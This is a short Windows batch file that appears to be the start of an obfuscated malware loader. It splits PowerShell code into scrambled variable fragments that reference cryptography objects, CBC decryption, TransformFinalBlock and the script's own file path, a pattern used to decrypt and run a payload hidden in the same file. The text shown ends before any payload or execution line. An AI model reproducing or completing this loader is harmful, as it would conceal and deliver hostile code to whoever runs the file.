@echo off
set "BFWtfwbKje=Obje"
set "uPacAyzDVq=ert]"
set "vaguKZRWrg=y.Pa"
set "dQKmQOVuJw= = ["
set "WOLaCAfWBK=$vNG"
set "UdVgygqQCM=)($Y"
set "XYandxQrrz=.Cry"
set "SqOZwDVhIu=nage"
set "EVEbTvqLoV=s75K"
set "WmUxgPvWav=y]::"
set "XYGMoQZxXk=ptor"
set "LReLvOPeqr=orF'"
set "PWqLcGsUOT=YDVR"
set "zTOQfPftQT=gCHa"
set "VsjvdPzXhA=gMod"
set "zGHQnYHigf=gCHa"
set "YmBkyVAHgo=-joi"
set "YflAxZopLi=comm"
set "SNnFJKfEcS=  $r"
set "iVnoCPinyE=tryP"
set "BIwBRkdGap= [st"
set "ZvZogwBTZI=();$"
set "NlEPpAGPHA=t Sy"
set "rASFJIyVpO=;$NO"
set "UXRkOmnFym=ct S"
set "LNbWGPgAPr=in $"
set "GDJYChCqpO=)($r"
set "qkazScyvMB=m(, "
set "jTHZVfeITn=ewLi"
set "lArLHWLJnz=tsWi"
set "MTjecbTOpN=-1.."
set "mmjKJcyahW=Fina"
set "BgZXEZPNga=BC;$"
set "HHxdnVCnAt=.Len"
set "GlEUXWjPcF=('%~f0'"
